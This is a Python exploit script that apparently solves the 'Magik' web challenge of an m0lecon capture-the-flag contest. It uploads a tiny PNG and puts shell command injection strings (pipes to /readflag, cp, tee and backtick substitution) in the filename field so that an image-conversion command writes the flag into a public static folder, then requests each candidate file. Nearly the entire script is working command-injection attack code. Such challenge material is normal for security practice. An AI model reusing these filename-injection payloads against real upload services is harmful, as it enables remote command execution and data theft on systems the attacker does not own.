#!/usr/bin/env python3
"""
Magik - Direct command execution attempt
Try to write flag directly to static/ directory
"""

import requests
import base64
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"

# Valid PNG
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

print("[*] Attempt 1: Pipe to write flag to static/flag.txt")
# name = "x.png |/readflag>static/flag.txt /app/out"
# This creates: convert /tmp/php... ... static/x.png |/readflag>static/flag.txt /app/out.png

r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x.png |/readflag>static/flag.txt /app/out'},
    timeout=10)
print(f"  Upload: {r.status_code}")

time.sleep(2)

# Try to retrieve
for fname in ['flag.txt', 'flag', 'x.png', 'out.png']:
    try:
        r2 = requests.get(f"{URL}static/{fname}", timeout=3)
        if r2.status_code == 200:
            print(f"\n[+] Found static/{fname}")
            print(f"Content ({len(r2.content)} bytes):")
            print(r2.text[:500])
            if 'ptm{' in r2.text or 'flag' in r2.text.lower():
                print(f"\n\n[!!!] POTENTIAL FLAG: {r2.text}")
    except Exception as e:
        pass

print("\n" + "="*60)
print("[*] Attempt 2: Write to writable temp location then copy")
# Try writing to /tmp first
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x.png |/readflag>/tmp/flag.txt /app/out'},
    timeout=10)
print(f"  Upload: {r.status_code}")

# Then copy to static
time.sleep(1)
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x.png |cp /tmp/flag.txt static/flag2.txt /app/out'},
    timeout=10)
print(f"  Copy: {r.status_code}")

time.sleep(2)

try:
    r2 = requests.get(f"{URL}static/flag2.txt", timeout=3)
    if r2.status_code == 200:
        print(f"\n[+] Found static/flag2.txt!")
        print(f"FLAG: {r2.text}")
except:
    pass

print("\n" + "="*60)
print("[*] Attempt 3: Use tee to write to multiple locations")
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x.png |/readflag|tee static/flag3.txt /app/out'},
    timeout=10)
print(f"  Upload: {r.status_code}")

time.sleep(2)

try:
    r2 = requests.get(f"{URL}static/flag3.txt", timeout=3)
    if r2.status_code == 200:
        print(f"\n[+] Found static/flag3.txt!")
        print(f"FLAG: {r2.text}")
except:
    pass

print("\n" + "="*60)
print("[*] Attempt 4: Backticks for command substitution")
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x.png `</readflag static/flag4.txt` /app/out'},
    timeout=10)
print(f"  Upload: {r.status_code}")

time.sleep(2)

try:
    r2 = requests.get(f"{URL}static/flag4.txt", timeout=3)
    if r2.status_code == 200:
        print(f"\n[+] Found static/flag4.txt!")
        print(f"FLAG: {r2.text}")
except:
    print("  Not found")
